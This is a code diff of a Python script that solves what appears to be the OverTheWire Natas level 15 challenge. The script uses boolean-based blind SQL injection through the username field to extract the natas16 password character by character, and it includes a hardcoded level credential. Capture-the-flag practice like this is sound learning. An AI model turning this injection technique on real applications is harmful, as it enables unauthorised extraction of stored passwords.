@@ -13,7 +13,7 @@ for i in range(1,70):
                 15,
                 "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65+n)}'}).text.__contains__("<br>This user exists.<br>"):
+                param={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65 + n)}'}).text.__contains__("<br>This user exists.<br>"):
             print(f'{i} {chr(65+n)}')
             w += chr(65+n)
             break
@@ -22,7 +22,7 @@ for i in range(1,70):
                 15,
                 "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                 endpoint="index.php?debug=yes",
-                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97+n)}'}).text.__contains__("<br>This user exists.<br>"):
+                param={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97 + n)}'}).text.__contains__("<br>This user exists.<br>"):
             print(f'{i} {chr(97+n)}')
             w += chr(97 + n)
             break
@@ -33,7 +33,7 @@ for i in range(1,70):
                     15,
                     "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
                     endpoint="index.php?debug=yes",
-                    data={"username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__("<br>This user exists.<br>"):
+                    param={"username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__("<br>This user exists.<br>"):
                 print(f'{i} {chr(48 + k)}')
                 w += chr(48 + k)
 
